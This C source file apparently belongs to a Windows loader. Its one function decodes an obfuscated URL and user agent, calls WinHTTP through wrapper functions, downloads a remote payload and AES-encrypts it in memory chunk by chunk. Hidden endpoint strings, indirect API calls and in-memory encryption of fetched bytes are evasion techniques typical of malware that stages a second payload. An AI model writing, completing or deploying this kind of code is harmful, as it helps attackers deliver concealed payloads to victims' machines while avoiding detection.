#include "lucky_http.h"
#include "lucky_net_configs.h"
unsigned char *DownloadAndEncryptBytes(size_t *outSize) {

  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  unsigned char *buffer = NULL;
  size_t totalSize = 0;

  URL_COMPONENTS uc = {0};
  uc.dwStructSize = sizeof(uc);
  uc.dwSchemeLength = (DWORD)-1;
  uc.dwHostNameLength = (DWORD)-1;
  uc.dwUrlPathLength = (DWORD)-1;
  uc.dwExtraInfoLength = (DWORD)-1;

  char url[sizeof(s_Url) * 2];

  DecodeString(url, s_Url);

  size_t len1 = MyMultiByteToWideChar(CP_UTF8, 0, url, -1, NULL, 0);
  if (len1 == 0) {

    return NULL;
  }

  wchar_t *wstr1 = malloc(len1 * sizeof(wchar_t));

  MyMultiByteToWideChar(CP_UTF8, 0, url, -1, wstr1, len1);

  if (!MyWinHttpCrackUrl(wstr1, 0, 0, &uc))
    goto cleanup;

  WCHAR host[256] = {0};
  WCHAR path[2048] = {0};

  if (uc.dwHostNameLength >= 256)
    goto cleanup;

  wcsncpy_s(host, 256, uc.lpszHostName, uc.dwHostNameLength);
  wcsncpy_s(path, 2048, uc.lpszUrlPath, uc.dwUrlPathLength);

  if (uc.dwExtraInfoLength > 0)
    wcsncat_s(path, 2048, uc.lpszExtraInfo, uc.dwExtraInfoLength);

  DWORD flags = 0;
  if (uc.nScheme == INTERNET_SCHEME_HTTPS)
    flags |= WINHTTP_FLAG_SECURE;

  char agent[128];
  DecodeString(agent, s_UserAgent);
  size_t len = MyMultiByteToWideChar(CP_UTF8, 0, agent, -1, NULL, 0);
  if (len == 0) {
    return NULL;
  }
  wchar_t *wstr = malloc(len * sizeof(wchar_t));

  MyMultiByteToWideChar(CP_UTF8, 0, agent, -1, wstr, len);

  hSession = MyWinHttpOpen(wstr, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    goto cleanup;

  hConnect = MyWinHttpConnect(hSession, host, uc.nPort, 0);
  if (!hConnect)
    goto cleanup;

  hRequest = MyWinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest)
    goto cleanup;

  if (!MyWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    goto cleanup;

  if (!MyWinHttpReceiveResponse(hRequest, NULL))
    goto cleanup;

  unsigned char temp[CHUNK_SIZE] __attribute__((aligned(16)));
  DWORD bytesRead = 0;

  do {

    if (!MyWinHttpReadData(hRequest, temp, CHUNK_SIZE, &bytesRead))
      goto cleanup;

    if (bytesRead == 0)
      break;

    DWORD paddedSize = ALIGN16(bytesRead);
    if (paddedSize > bytesRead)
      memset(temp + bytesRead, 0, paddedSize - bytesRead);

    for (DWORD i = 0; i < paddedSize; i += AES_BLOCK_SIZE) {
      aes128_encrypt_block(temp + i, temp + i, encKeys);
    }

    unsigned char *newBuf = realloc(buffer, totalSize + paddedSize);
    if (!newBuf)
      goto cleanup;

    buffer = newBuf;
    memcpy(buffer + totalSize, temp, paddedSize);
    totalSize += paddedSize;

  } while (bytesRead > 0);

  if (outSize)
    *outSize = totalSize;

cleanup:
  if (hRequest)
    MyWinHttpCloseHandle(hRequest);
  if (hConnect)
    MyWinHttpCloseHandle(hConnect);
  if (hSession)
    MyWinHttpCloseHandle(hSession);

  return buffer;
}
